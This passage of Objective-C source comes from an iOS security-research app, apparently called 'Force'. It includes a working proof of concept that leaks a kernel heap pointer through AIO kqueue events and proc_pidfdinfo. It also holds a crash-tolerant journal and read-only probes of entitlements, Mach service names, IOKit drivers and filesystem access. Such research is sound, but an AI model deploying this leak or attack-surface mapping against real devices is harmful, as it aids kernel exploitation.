    self.runButton.enabled = NO;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0), ^{
        NSString *result = [self runDisclosure];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.logView.text = result;
            // Intentionally one-shot per page visit.
        });
    });
}
- (NSString *)runDisclosure {
    NSMutableString *log = [NSMutableString stringWithFormat:
       @"AIO metadata read-only test\nOS %@\n", UIDevice.currentDevice.systemVersion];
    ProbePidFdInfo info = (ProbePidFdInfo)dlsym(RTLD_DEFAULT,"proc_pidfdinfo");
    if (!info) return [log stringByAppendingString:@"UNAVAILABLE: proc_pidfdinfo is not exported."];
    int kq = kqueue();
    if (kq < 0) return [log stringByAppendingFormat:@"kqueue error: %d",errno];
    NSString *name = [NSString stringWithFormat:@"aio-%@.fifo",NSUUID.UUID.UUIDString];
    NSString *file = [NSTemporaryDirectory() stringByAppendingPathComponent:name];
    const char *path = file.fileSystemRepresentation;
    int fd = -1, writer = -1, err = 0;
    struct aiocb *cb = NULL;
    if (mkfifo(path,0600) != 0) {
        [log appendFormat:@"mkfifo errno=%d",errno];
        goto cleanup;
    }
    fd = open(path,O_RDONLY | O_NONBLOCK);
    if (fd < 0) { [log appendFormat:@"FIFO read open errno=%d",errno]; goto cleanup; }
    writer = open(path,O_WRONLY | O_NONBLOCK);
    if (writer < 0) { [log appendFormat:@"FIFO write open errno=%d",errno]; goto cleanup; }
    int flags = fcntl(fd,F_GETFL);
    if (flags >= 0) fcntl(fd,F_SETFL,flags & ~O_NONBLOCK);
    cb = calloc(1,sizeof(*cb));
    if (!cb) { [log appendString:@"No memory for AIO control block"]; goto cleanup; }
    void *buf = calloc(1,32);
    if (!buf) { [log appendString:@"No memory for AIO buffer"]; goto cleanup; }
    cb->aio_fildes=fd;
    cb->aio_buf=buf;
    cb->aio_nbytes=32;
    cb->aio_sigevent.sigev_notify=SIGEV_KEVENT;
    cb->aio_sigevent.sigev_signo=kq;
    if (aio_read(cb) != 0) {
        err = errno;
        [log appendFormat:@"aio_read unavailable, errno=%d",err];
        free(buf); free(cb); cb=NULL;
        goto cleanup;
    }
    BOOL found = NO;
    for (int attempt=0; attempt<12 && !found; attempt++) {
        struct ProbeAIOExtInfo records[16] = {0};
        errno=0;
        int amount = info(getpid(),kq,9,records,(int)sizeof(records));
        if (amount < 0) {
            [log appendFormat:@"proc_pidfdinfo denied/failed errno=%d",errno];
            break;
        }
        NSUInteger count = MIN((NSUInteger)16,
            (NSUInteger)(amount > 16 ? amount/sizeof(records[0]) : amount));
        for (NSUInteger i=0; i<count; i++) {
            uint64_t value = records[i].savedData;
            if (records[i].event.filter == EVFILT_AIO &&
                records[i].event.data == 0 &&
                value >= 0xffff000000000000ULL) {
                [log appendFormat:@"PASS: leaked aio_workq_entry heap pointer 0x%016llx; event data=%lld\nNot a kernel base, kernel R/W or code execution.\n",
                    (unsigned long long)value,(long long)records[i].event.data];
                found=YES;
                break;
            }
        }
        if (!found) usleep(20000);
    }
    if (!found) [log appendString:@"NOT VERIFIED: No kernel-looking AIO saved-data returned.\n"];
    // Complete only this application's own pending FIFO operation.
    uint8_t payload[32] = {0};
    (void)write(writer,payload,sizeof(payload));
    for (int tries=0;tries<50;tries++) {
        int state=aio_error(cb);
        if (state!=EINPROGRESS) break;
        usleep(10000);
    }
    int state=aio_error(cb);
    if (state!=EINPROGRESS) {
        (void)aio_return(cb);
        free(buf); free(cb); cb=NULL;
    } else {
        [log appendString:@"AIO still pending; retaining control block until process exit.\n"];
    }
cleanup:
    if (fd>=0) close(fd);
    if (writer>=0) close(writer);
    close(kq);
    unlink(path);
    return log;
}
@end



#pragma mark - Force durable journal (Step 2 of 4)
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/time.h>

@interface ForceLog : NSObject
@property(nonatomic,readonly) NSString *path;
@property(nonatomic,readonly) NSString *lastError;
@property(nonatomic,readonly) NSString *recoveryReport;
+ (instancetype)shared;
- (BOOL)record:(NSString *)kind session:(NSString *)session method:(NSString *)method
      attempt:(NSString *)attempt details:(NSDictionary *)details;
@end

@implementation ForceLog {
    int _descriptor;
    uint64_t _sequence;
    NSISO8601DateFormatter *_clock;
    NSString *_lastError;
    NSString *_recoveryReport;
}
+ (instancetype)shared {
    static ForceLog *singleton=nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{singleton=[ForceLog new];});
    return singleton;
}
- (instancetype)init {
    if (!(self=[super init])) return nil;
    NSURL *directory=[[[NSFileManager defaultManager]
        URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] firstObject];
    _path=[[directory URLByAppendingPathComponent:@"force-research.jsonl"] path];
    _clock=[NSISO8601DateFormatter new];
    _clock.formatOptions=NSISO8601DateFormatWithInternetDateTime |
                         NSISO8601DateFormatWithFractionalSeconds;
    _clock.timeZone=[NSTimeZone timeZoneForSecondsFromGMT:0];
    _descriptor=open(_path.fileSystemRepresentation,O_CREAT|O_APPEND|O_WRONLY,0600);
    if (_descriptor<0)
        _lastError=[NSString stringWithFormat:@"Open failed, errno %d",errno];
    _recoveryReport=[self inspectExistingJournal];
    [self record:@"app_open" session:@"lifecycle" method:@"recovery" attempt:@""
        details:@{@"recovery_report":_recoveryReport ?: @"unknown"}];
    return self;
}

- (NSString *)recoveryReport {return _recoveryReport ?: @"No previous session data.";}
- (long long)currentBootMs {
    NSTimeInterval boot=[NSDate date].timeIntervalSince1970 -
                          NSProcessInfo.processInfo.systemUptime;
    return (long long)(boot*1000.0);
}
/* The journal is event-oriented: an unmatched BEFORE means its AFTER was
 * never written, not that the last API call necessarily caused termination.
 * A changed boot epoch suggests reboot, but cannot prove kernel panic. */
- (NSString *)inspectExistingJournal {
    NSData *data=[NSData dataWithContentsOfFile:_path options:0 error:nil];
    if (!data.length) return @"No previous Force journal entries.";
    NSString *contents=[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    if (!contents) return @"Journal cannot be decoded as UTF-8; export for inspection.";
    NSMutableDictionary *openSessions=[NSMutableDictionary new];
    NSMutableDictionary *openAttempts=[NSMutableDictionary new];
    long long previousBoot=0;
    NSUInteger rows=0;
    for (NSString *line in [contents componentsSeparatedByString:@"\n"]) {
        if (line.length==0) continue;
        NSDictionary *entry=[NSJSONSerialization JSONObjectWithData:
            [line dataUsingEncoding:NSUTF8StringEncoding] options:0 error:nil];
        if (![entry isKindOfClass:NSDictionary.class]) continue;
        rows++;
        _sequence=MAX(_sequence,[entry[@"sequence"] unsignedLongLongValue]);
        NSString *kind=entry[@"event"], *session=entry[@"session"], *attempt=entry[@"attempt"];
        if (![kind isKindOfClass:NSString.class] ||
            ![session isKindOfClass:NSString.class]) continue;
        if ([kind isEqualToString:@"session_start"]) {
            openSessions[session]=entry;
            NSNumber *boot=entry[@"boot_epoch_ms"];
            if ([boot isKindOfClass:NSNumber.class]) previousBoot=boot.longLongValue;
        } else if ([kind isEqualToString:@"session_end"]) {
            [openSessions removeObjectForKey:session];
        } else if ([kind isEqualToString:@"before"] &&
                   [attempt isKindOfClass:NSString.class] && attempt.length) {
            openAttempts[attempt]=entry;
        } else if ([kind isEqualToString:@"after"] &&
                   [attempt isKindOfClass:NSString.class]) {
            [openAttempts removeObjectForKey:attempt];
        }
    }
    if (openSessions.count==0)
        return [NSString stringWithFormat:@"Previous sessions completed or none started. %lu journal entries.",
            (unsigned long)rows];
    NSDictionary *latest=nil;
    for (NSDictionary *candidate in openSessions.allValues)
        if (!latest || [candidate[@"unix_ms"] longLongValue]>[latest[@"unix_ms"] longLongValue])
            latest=candidate;
    NSString *session=latest[@"session"];
    NSDictionary *pending=nil;
    for (NSDictionary *candidate in openAttempts.allValues) {
        if (![candidate[@"session"] isEqualToString:session]) continue;
        if (!pending || [candidate[@"unix_ms"] longLongValue]>[pending[@"unix_ms"] longLongValue])
            pending=candidate;
    }
    BOOL rebootObserved=previousBoot>0 && llabs(previousBoot-[self currentBootMs])>120000;
    NSString *classification=rebootObserved ?
        @"Possible device reboot since session start; panic is NOT established." :
        @"Session ended without session_end. App quit, crash, suspension or termination possible; cause UNKNOWN.";
    NSString *last=pending ?
        [NSString stringWithFormat:@"Unfinished attempt %@, method %@, input %@.",
          pending[@"attempt"] ?: @"?",pending[@"method"] ?: @"?",pending[@"details"] ?: @{}] :
        @"No unmatched before record; interruption occurred outside an in-flight operation.";
    return [NSString stringWithFormat:@"%@\nSession %@\n%@\nExport JSONL for analysis.",
        classification,session ?: @"unknown",last];
}

- (NSString *)lastError { @synchronized(self) {return _lastError;} }
- (BOOL)record:(NSString *)kind session:(NSString *)session method:(NSString *)method
      attempt:(NSString *)attempt details:(NSDictionary *)details {
    @synchronized(self) {
        if (_descriptor<0) return NO;
        NSDate *date=[NSDate date];
        NSDictionary *entry=@{
            @"schema":@1, @"sequence":@(++_sequence),
            @"time": [_clock stringFromDate:date],
            @"unix_ms":@((long long)(date.timeIntervalSince1970*1000.0)),
            @"boot_epoch_ms":@([self currentBootMs]),
            @"event":kind ?: @"unknown", @"session":session ?: @"",
            @"method":method ?: @"", @"attempt":attempt ?: @"",
            @"details":details ?: @{}
        };
        NSError *error=nil;
        NSData *json=[NSJSONSerialization dataWithJSONObject:entry options:0 error:&error];
        if (!json) {
            _lastError=error.localizedDescription ?: @"Could not encode JSON";
            return NO;
        }
        NSMutableData *line=[json mutableCopy];
        const char newline='\n';
        [line appendBytes:&newline length:1];
        const uint8_t *bytes=line.bytes;
        size_t length=line.length;
        while (length) {
            ssize_t count=write(_descriptor,bytes,length);
            if (count<0 && errno==EINTR) continue;
            if (count<=0) {
                _lastError=[NSString stringWithFormat:@"Write failed, errno %d",errno];
                return NO;
            }
            bytes+=count;
            length-=(size_t)count;
        }
        if (fsync(_descriptor)!=0) {
            _lastError=[NSString stringWithFormat:@"Sync failed, errno %d",errno];
            return NO;
        }
        _lastError=nil;
        return YES;
    }
}
- (void)dealloc { if (_descriptor>=0) close(_descriptor); }
@end


#pragma mark - Force bounded diagnostic workers (Step 3 of 4)
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/utsname.h>
static NSArray<NSString *> *ForceItems(NSUInteger method) {
    switch(method) {
        case 0: return @[@"com.apple.developer.game-center",@"get-task-allow",
                         @"com.apple.developer.team-identifier"];
        case 1: return @[@"com.apple.gamed",@"com.apple.cfprefsd.xpc.daemon",
                         @"com.apple.backboardd",@"com.apple.lsd"];
        case 2: return @[@"IOSurfaceRoot",@"AOPTouchHIDDriver",
                         @"IOMobileFramebuffer",@"AppleAVE2Driver"];
        case 3: return @[@"documents",@"bundle",@"temporary",
                          @"system_library",@"usr_lib",@"mobile_library"];
        case 4: return @[@"proc_pidfdinfo",@"sandbox_check",
                         @"task_for_pid",@"bootstrap_look_up",@"SecTaskCreateFromSelf"];
        case 5: return @[@"thermal",@"low_power",@"memory_peak",@"cpu_usage"];
    }
    return @[];
}
static NSDictionary *ForceBoundedCheck(NSUInteger method, NSString *item) {
    if (method==0) {
        void *security=dlopen("/System/Library/Frameworks/Security.framework/Security",RTLD_LAZY);
        if (!security) return @{@"status":@"unavailable"};
        typedef CFTypeRef (*TaskCreate)(CFAllocatorRef);
        typedef CFTypeRef (*TaskValue)(CFTypeRef,CFStringRef,CFErrorRef *);
        TaskCreate create=(TaskCreate)dlsym(security,"SecTaskCreateFromSelf");
        TaskValue value=(TaskValue)dlsym(security,"SecTaskCopyValueForEntitlement");
        if (!create || !value) {
            dlclose(security);
            return @{@"status":@"unavailable",
                     @"reason":@"Security entitlement inspection symbols missing"};
        }
        CFTypeRef task=create(kCFAllocatorDefault);
        if (!task) {
            dlclose(security);
            return @{@"status":@"unavailable",
                     @"reason":@"Could not inspect this process signature"};
        }
        CFErrorRef queryError=NULL;
        CFTypeRef result=value(task,(__bridge CFStringRef)item,&queryError);
        BOOL present=result!=NULL;
        NSString *valueType=@"absent";
        id booleanEnabled=[NSNull null];
        if (result) {
            CFTypeID type=CFGetTypeID(result);
            if (type==CFBooleanGetTypeID()) {
                valueType=@"boolean";
                booleanEnabled=@(CFBooleanGetValue((CFBooleanRef)result));
            } else if (type==CFStringGetTypeID()) {
                valueType=@"string";
            } else if (type==CFArrayGetTypeID()) {
                valueType=@"array";
            } else if (type==CFDictionaryGetTypeID()) {
                valueType=@"dictionary";
            } else if (type==CFNumberGetTypeID()) {
                valueType=@"number";
            } else {
                valueType=@"other";
            }
        }
        NSMutableDictionary *report=[@{
            @"status":@"ok",
            @"entitlement_present":@(present),
            @"value_type":valueType,
            @"boolean_enabled":booleanEnabled,
            @"note":@"Effective entitlement value on this process; does not establish remote service authorization or an exploit"
        } mutableCopy];
        if (queryError) {
            report[@"query_error_code"]=@(CFErrorGetCode(queryError));
            CFRelease(queryError);
        }
        if (result) CFRelease(result);
        CFRelease(task);
        dlclose(security);
        return report;
    }
    if (method==1) {
        typedef kern_return_t (*Lookup)(mach_port_t,const char *,mach_port_t *);
        Lookup lookup=(Lookup)dlsym(RTLD_DEFAULT,"bootstrap_look_up");
        if (!lookup) return @{@"status":@"unavailable"};
        mach_port_t service=MACH_PORT_NULL;
        mach_port_t bootstrap=MACH_PORT_NULL;
        kern_return_t kr=task_get_special_port(mach_task_self(),TASK_BOOTSTRAP_PORT,&bootstrap);
        if (kr==KERN_SUCCESS && bootstrap!=MACH_PORT_NULL)
            kr=lookup(bootstrap,item.UTF8String,&service);
        if (bootstrap!=MACH_PORT_NULL) mach_port_deallocate(mach_task_self(),bootstrap);
        mach_port_type_t portRights=0;
        kern_return_t rightsReturn=service!=MACH_PORT_NULL ?
            mach_port_type(mach_task_self(),service,&portRights) : KERN_INVALID_NAME;
        BOOL hasSendRight=rightsReturn==KERN_SUCCESS &&
            ((portRights & MACH_PORT_TYPE_SEND)!=0);
        if (service!=MACH_PORT_NULL) mach_port_deallocate(mach_task_self(),service);
        return @{@"status":@"ok",@"return_code":@(kr),
                 @"lookup_success":@(kr==KERN_SUCCESS && service!=MACH_PORT_NULL),
                 @"send_right_observed":@(hasSendRight),
                 @"port_rights_check_return_code":@(rightsReturn),
                 @"note":@"Bootstrap name resolution and local right inspection only; no service message sent"};
    }
    if (method==2) {
        CFMutableDictionaryRef match=IOServiceMatching(item.UTF8String);
        if (!match) return @{@"status":@"unavailable"};
        io_service_t object=IOServiceGetMatchingService(kIOMainPortDefault,match);
        BOOL exists=object!=IO_OBJECT_NULL;
        if (object==IO_OBJECT_NULL)
            return @{@"status":@"ok",@"service_registered":@NO,
                     @"note":@"No user-client connection attempted"};
        io_name_t className={0};
        kern_return_t classReturn=IOObjectGetClass(object,className);
        io_string_t registryPath={0};
        kern_return_t pathReturn=IORegistryEntryGetPath(object,kIOServicePlane,registryPath);
        CFMutableDictionaryRef properties=NULL;
        kern_return_t propertyReturn=IORegistryEntryCreateCFProperties(
            object,&properties,kCFAllocatorDefault,0);
        NSMutableArray<NSString *> *propertyNames=[NSMutableArray new];
        NSUInteger propertyCount=0;
        if (propertyReturn==KERN_SUCCESS && properties) {
            NSDictionary *dictionary=(__bridge NSDictionary *)properties;
            propertyCount=dictionary.count;
            for (id key in dictionary) {
                if (![key isKindOfClass:NSString.class]) continue;
                NSString *name=(NSString *)key;
                // Avoid persisting identifiers or opaque values in exported logs.
                NSString *lower=name.lowercaseString;
                if ([lower containsString:@"serial"] ||
                    [lower containsString:@"uuid"] ||
                    [lower containsString:@"unique"] ||
                    [lower containsString:@"address"]) continue;
                if (name.length<=80) [propertyNames addObject:name];
            }
            [propertyNames sortUsingSelector:@selector(compare:)];
            if (propertyNames.count>24)
                [propertyNames removeObjectsInRange:NSMakeRange(24,propertyNames.count-24)];
            CFRelease(properties);
        }
        io_registry_entry_t parent=IO_OBJECT_NULL;
        kern_return_t parentReturn=IORegistryEntryGetParentEntry(object,kIOServicePlane,&parent);
        io_name_t parentClass={0};
        if (parentReturn==KERN_SUCCESS && parent!=IO_OBJECT_NULL) {
            IOObjectGetClass(parent,parentClass);
            IOObjectRelease(parent);
        }
        IOObjectRelease(object);
        return @{@"status":@"ok",@"service_registered":@(exists),
                 @"service_class":classReturn==KERN_SUCCESS ?
                     [NSString stringWithUTF8String:className] : @"unavailable",
                 @"parent_class":parentReturn==KERN_SUCCESS ?
                     [NSString stringWithUTF8String:parentClass] : @"unavailable",
                 @"registry_path":pathReturn==KERN_SUCCESS ?
                     [NSString stringWithUTF8String:registryPath] : @"unavailable",
                 @"property_query_return_code":@(propertyReturn),
                 @"property_count":@(propertyCount),
                 @"property_key_sample":propertyNames,
                 @"note":@"Registry class, path and property-key metadata only; no user-client connection attempted"};
    }
    if (method==3) {
        NSDictionary<NSString *,NSString *> *paths=@{
            @"documents":[NSSearchPathForDirectoriesInDomains(
                NSDocumentDirectory,NSUserDomainMask,YES) firstObject] ?: @"",
            @"bundle":NSBundle.mainBundle.bundlePath ?: @"",
            @"temporary":NSTemporaryDirectory() ?: @"",
            @"system_library":@"/System/Library",
            @"usr_lib":@"/usr/lib",
            @"mobile_library":@"/var/mobile/Library"
        };
        NSString *location=paths[item] ?: @"";
        if (!location.length) return @{@"status":@"unavailable"};
        struct stat fileStat={0};
        errno=0;
        int statCode=stat(location.fileSystemRepresentation,&fileStat);
        int statError=statCode==0 ? 0 : errno;
        errno=0;
        int readCode=access(location.fileSystemRepresentation,R_OK);
        int readError=readCode==0 ? 0 : errno;
        errno=0;
        int writeCode=access(location.fileSystemRepresentation,W_OK);
        int writeError=writeCode==0 ? 0 : errno;
        return @{@"status":@"ok",@"stat_success":@(statCode==0),
                 @"stat_errno":@(statError),@"read_access":@(readCode==0),
                 @"read_errno":@(readError),@"write_access":@(writeCode==0),
                 @"write_errno":@(writeError),
                 @"path_category":item,
                 @"note":@"Metadata and access(2) checks only; no file contents read or writes attempted; POSIX access is not a sandbox bypass proof"};
    }
    if (method==4) {
        void *symbol=dlsym(RTLD_DEFAULT,item.UTF8String);
        Dl_info source={0};
        BOOL mapped=symbol && dladdr(symbol,&source)!=0;
        return @{@"status":@"ok",@"symbol_exported":@(symbol!=NULL),
                 @"image_name":mapped && source.dli_fname ?
                     [[NSString stringWithUTF8String:source.dli_fname] lastPathComponent] : @"unavailable",
                 @"note":@"Symbol presence only; function not called"};
    }
    if (method==5) {
        NSProcessInfo *process=NSProcessInfo.processInfo;
        if ([item isEqualToString:@"thermal"])
            return @{@"status":@"ok",@"thermal_state":@((NSInteger)process.thermalState)};
        if ([item isEqualToString:@"low_power"])
            return @{@"status":@"ok",@"low_power_mode":@(process.isLowPowerModeEnabled)};
        struct rusage usage={0};
        errno=0;
        int code=getrusage(RUSAGE_SELF,&usage);
        if (code!=0) return @{@"status":@"unavailable",@"errno":@(errno)};
        if ([item isEqualToString:@"memory_peak"])
            return @{@"status":@"ok",@"peak_resident_native_units":@((long long)usage.ru_maxrss),
                     @"note":@"ru_maxrss units are platform-dependent"};
        if ([item isEqualToString:@"cpu_usage"]) {
            long long userUs=(long long)usage.ru_utime.tv_sec*1000000LL+usage.ru_utime.tv_usec;
            long long systemUs=(long long)usage.ru_stime.tv_sec*1000000LL+usage.ru_stime.tv_usec;
            return @{@"status":@"ok",@"user_cpu_us":@(userUs),
                     @"system_cpu_us":@(systemUs)};
        }
    }
    return @{@"status":@"unsupported"};
}


static NSDictionary *ForceStableState(NSUInteger method, NSDictionary *result) {
    NSMutableDictionary *state=[result mutableCopy];
    [state removeObjectForKey:@"note"];
    if (method==5) {
        // Resource counters naturally change; only thermal/power transitions are significant.
        [state removeObjectForKey:@"peak_resident_native_units"];
        [state removeObjectForKey:@"user_cpu_us"];
        [state removeObjectForKey:@"system_cpu_us"];
    }
    return state;
}
static NSDictionary *ForceEnvironmentSnapshot(void) {
    struct utsname machine={0};
    int code=uname(&machine);
    UIDevice *device=UIDevice.currentDevice;
    NSBundle *bundle=NSBundle.mainBundle;
    return @{
        @"system":device.systemName ?: @"unknown",
        @"os_version":device.systemVersion ?: @"unknown",
        @"os_build_description":NSProcessInfo.processInfo.operatingSystemVersionString ?: @"unknown",
        @"kernel_release":code==0 ? [NSString stringWithUTF8String:machine.release] : @"unknown",
        @"device_machine":code==0 ? [NSString stringWithUTF8String:machine.machine] : @"unknown",
        @"bundle_id":bundle.bundleIdentifier ?: @"unknown",
        @"app_version":[bundle objectForInfoDictionaryKey:@"CFBundleShortVersionString"] ?: @"unknown",
        @"session_type":@"bounded_read_only_diagnostics",
        @"scope":@"No kernel exploitation, privileged code injection or sandbox escape attempted"
    };
}


/* Compact evidence package for offline review. No exploitation claims. */
static NSDictionary *ForceResearchReport(NSString *journalPath) {
    NSData *source=[NSData dataWithContentsOfFile:journalPath options:0 error:nil];
    if (!source.length) return @{@"status":@"no_journal_data"};
    NSString *text=[[NSString alloc] initWithData:source encoding:NSUTF8StringEncoding];
    if (!text) return @{@"status":@"invalid_journal_encoding"};
    NSMutableArray<NSDictionary *> *events=[NSMutableArray new];
    NSString *latest=nil, *previous=nil;
    for (NSString *row in [text componentsSeparatedByString:@"\n"]) {
        if (!row.length) continue;
        id item=[NSJSONSerialization JSONObjectWithData:
            [row dataUsingEncoding:NSUTF8StringEncoding] options:0 error:nil];
        if (![item isKindOfClass:NSDictionary.class]) continue;
        [events addObject:item];
        if ([item[@"event"] isEqualToString:@"session_start"]) {
            previous=latest;
            latest=item[@"session"];
        }
    }
    if (!latest.length)
        return @{@"status":@"no_completed_or_active_session",
                 @"parsed_rows":@(events.count)};
    NSMutableDictionary<NSString *,NSDictionary *> *inputs=[NSMutableDictionary new];
    NSMutableDictionary<NSString *,NSMutableDictionary *> *caseStats=[NSMutableDictionary new];
    NSMutableDictionary<NSString *,NSDictionary *> *previousStates=[NSMutableDictionary new];
    NSMutableArray *interesting=[NSMutableArray new];
    NSDictionary *environment=@{};
    BOOL ended=NO;
    NSInteger completed=0, firstSeen=0, changed=0, unavailable=0;
    long long began=0, last=0;
    for (NSDictionary *entry in events) {
        NSString *session=entry[@"session"];
        NSString *kind=entry[@"event"];
        NSString *method=entry[@"method"];
        NSDictionary *details=entry[@"details"];
        if (![session isKindOfClass:NSString.class] ||
            ![kind isKindOfClass:NSString.class] ||
            ![details isKindOfClass:NSDictionary.class]) continue;
        if ([session isEqualToString:previous] &&
            [kind isEqualToString:@"after"]) {
            NSString *caseName=details[@"case"];
            NSDictionary *result=details[@"result"];
            if ([caseName isKindOfClass:NSString.class] &&
                [method isKindOfClass:NSString.class] &&
                [result isKindOfClass:NSDictionary.class]) {
                NSString *key=[NSString stringWithFormat:@"%@:%@",method,caseName];
                previousStates[key]=ForceStableState(method.integerValue,result);
            }
        }
        if (![session isEqualToString:latest]) continue;
        last=MAX(last,[entry[@"unix_ms"] longLongValue]);
        if ([kind isEqualToString:@"session_start"]) {
            began=[entry[@"unix_ms"] longLongValue];
            if ([details[@"environment"] isKindOfClass:NSDictionary.class])
                environment=details[@"environment"];
        }
        if ([kind isEqualToString:@"session_end"]) ended=YES;
        NSString *attempt=entry[@"attempt"];
        if ([kind isEqualToString:@"before"] &&
            [attempt isKindOfClass:NSString.class] && attempt.length)
            inputs[attempt]=entry;
        if (![kind isEqualToString:@"after"]) continue;
        completed++;
        if ([attempt isKindOfClass:NSString.class]) [inputs removeObjectForKey:attempt];
        NSString *caseName=details[@"case"];
        if (![caseName isKindOfClass:NSString.class]) caseName=@"legacy_case_unknown";
        if (![method isKindOfClass:NSString.class]) method=@"unknown";
        NSString *key=[NSString stringWithFormat:@"%@:%@",method,caseName];
        NSMutableDictionary *stats=caseStats[key];
        if (!stats) {
            stats=[@{@"method":method,@"case":caseName,@"count":@0,
                @"changes":@0,@"unavailable":@0,
                @"latency_sum_ms":@0,@"max_latency_ms":@0} mutableCopy];
            caseStats[key]=stats;
        }
        stats[@"count"]=@([stats[@"count"] integerValue]+1);
        if ([details[@"latency_ms"] isKindOfClass:NSNumber.class]) {
            NSInteger millis=MAX(0,[details[@"latency_ms"] integerValue]);
            stats[@"latency_sum_ms"]=@([stats[@"latency_sum_ms"] integerValue]+millis);
            stats[@"max_latency_ms"]=@(MAX([stats[@"max_latency_ms"] integerValue],millis));
        }
        NSDictionary *result=details[@"result"];
        if (![result isKindOfClass:NSDictionary.class]) result=@{};
        if (!stats[@"first_result"]) stats[@"first_result"]=result;
        stats[@"last_result"]=result;
        NSString *finding=details[@"finding"];
        if ([finding isEqualToString:@"first_seen"]) firstSeen++;
        if ([finding isEqualToString:@"changed"]) {
            changed++;
            stats[@"changes"]=@([stats[@"changes"] integerValue]+1);
        }
        if (![result[@"status"] isEqualToString:@"ok"]) {
            unavailable++;
            stats[@"unavailable"]=@([stats[@"unavailable"] integerValue]+1);
        }
        // Repeating the same expected unavailable response is not a new finding.
        if (([finding isEqualToString:@"changed"] ||
             (![result[@"status"] isEqualToString:@"ok"] &&
               [finding isEqualToString:@"first_seen"])) && interesting.count<50)
            [interesting addObject:@{@"time":entry[@"time"] ?: @"",
                @"method":method,@"case":caseName,@"finding":finding ?: @"",
                @"previous":details[@"previous_state"] ?: @{},@"result":result}];
    }
    NSMutableArray *betweenSessions=[NSMutableArray new];
    for (NSString *key in [[caseStats allKeys] sortedArrayUsingSelector:@selector(compare:)]) {
        NSDictionary *prior=previousStates[key];
        if (!prior) continue;
        NSDictionary *newest=ForceStableState([caseStats[key][@"method"] integerValue],
                                           caseStats[key][@"last_result"]);
        if (![prior isEqualToDictionary:newest])
            [betweenSessions addObject:@{@"case_key":key,
                 @"previous_session_state":prior,@"current_session_state":newest}];
    }
    // Actionable evidence interpretation. A successful lookup is not an authorization grant.
    NSMutableArray<NSDictionary *> *prioritizedQuestions=[NSMutableArray new];
    NSMutableArray<NSDictionary *> *signals=[NSMutableArray new];
    NSDictionary *gameCenter=caseStats[@"0:com.apple.developer.game-center"];
    NSDictionary *gamedStats=caseStats[@"1:com.apple.gamed"];
    NSDictionary *aop=caseStats[@"2:AOPTouchHIDDriver"];
    NSDictionary *surface=caseStats[@"2:IOSurfaceRoot"];
    NSDictionary *gcResult=gameCenter[@"last_result"];
    NSDictionary *gamedStatsResult=gamedStats[@"last_result"];
    if (gameCenter) {
        id value=gcResult[@"boolean_enabled"];
        NSString *classification=[value isKindOfClass:NSNumber.class] ?
            ([value boolValue] ? @"enabled_boolean" : @"disabled_boolean") :
            ([gcResult[@"entitlement_present"] boolValue] ?
                @"present_nonboolean_value" : @"absent");
        [signals addObject:@{@"topic":@"game_center_entitlement",
            @"classification":classification,@"evidence":gcResult ?: @{}}];
        [prioritizedQuestions addObject:@{
            @"priority":@1,
            @"topic":@"Game Center authorization baseline",
            @"question":@"Does the effective Game Center entitlement value match the app signing profile, and does it remain unchanged across restarts and resigning?",
            @"evidence_required":@"Entitlement type/value, app signing identity and comparable session reports",
            @"limitation":@"Entitlement presence does not imply privileged gamedStats messaging"
        }];
    }
    if (gamedStats) {
        [signals addObject:@{@"topic":@"gamed_name_resolution",
            @"classification":[gamedStatsResult[@"lookup_success"] boolValue] ?
                 @"name_resolved" : @"name_not_resolved",
            @"evidence":gamedStatsResult ?: @{}}];
        [prioritizedQuestions addObject:@{
            @"priority":@2,
            @"topic":@"Mach lookup baseline",
            @"question":@"Are lookup return codes consistent across runs, and are changes correlated with a device or signing configuration change?",
            @"evidence_required":@"Exact return codes, OS/build metadata and before/after sessions",
            @"limitation":@"Bootstrap name lookup alone does not establish usable authorization"
        }];
    }
    if (aop || surface) {
        [prioritizedQuestions addObject:@{
            @"priority":@3,
            @"topic":@"IOKit registry baseline",
            @"question":@"Do the registry class, parent class and service path stay stable across sessions on the same OS build?",
            @"evidence_required":@"Registry metadata and comparable firmware versions",
            @"limitation":@"Registry inventory does not open user clients or establish kernel memory access"
        }];
    }
    if (betweenSessions.count) {
        [prioritizedQuestions insertObject:@{
            @"priority":@0,@"topic":@"Cross-session differences",
            @"question":@"Which recorded configuration changed before these observed state differences?",
            @"evidence_required":@"Compare signing identity, firmware, selected methods and environment snapshot",
            @"limitation":@"A changed result is a hypothesis, not proof of exploitation"
        } atIndex:0];
    }
    if (prioritizedQuestions.count==0) {
        [prioritizedQuestions addObject:@{@"priority":@1,@"topic":@"Missing diagnostic coverage",
            @"question":@"Run the entitlement, Mach and IOKit inventory methods for one complete session before interpreting outcomes.",
            @"evidence_required":@"Completed checks with nonempty per-case results",
            @"limitation":@"No security boundary conclusion is available"}];
    }
    NSMutableArray *cases=[NSMutableArray new];
    for (NSString *key in [[caseStats allKeys] sortedArrayUsingSelector:@selector(compare:)]) {
        NSMutableDictionary *stats=caseStats[key];
        NSInteger count=[stats[@"count"] integerValue];
        stats[@"average_latency_ms"]=@(count>0 ? [stats[@"latency_sum_ms"] doubleValue]/count : 0);
        [cases addObject:stats];
    }

    // Evidence-aware research questions. A positive lookup is NOT an exploit.
    NSMutableArray *questions=[NSMutableArray new];
    NSDictionary *game=caseStats[@"0:com.apple.developer.game-center"][@"last_result"];
    NSDictionary *gamed=caseStats[@"1:com.apple.gamed"][@"last_result"];
    if (game || gamed) {
        BOOL entitled=[game[@"boolean_enabled"] respondsToSelector:@selector(boolValue)] &&
                       [game[@"boolean_enabled"] boolValue];
        BOOL resolvable=[gamed[@"lookup_success"] boolValue];
        [questions addObject:@{
            @"topic":@"Game Center signing versus service name resolution",
            @"evidence":@{@"entitlement_boolean_enabled":game[@"boolean_enabled"] ?: [NSNull null],
                          @"entitlement_value_type":game[@"value_type"] ?: @"not_observed",
                          @"gamed_name_resolvable":@(resolvable),
                          @"gamed_return_code":gamed[@"return_code"] ?: [NSNull null],
                          @"gamed_send_right_observed":gamed[@"send_right_observed"] ?: @NO},
            @"assessment":entitled && resolvable ?
                @"Both signing entitlement and name resolution were observed. Neither demonstrates a privileged service call." :
                @"At least one prerequisite was absent or unverified; service authorization remains unknown.",
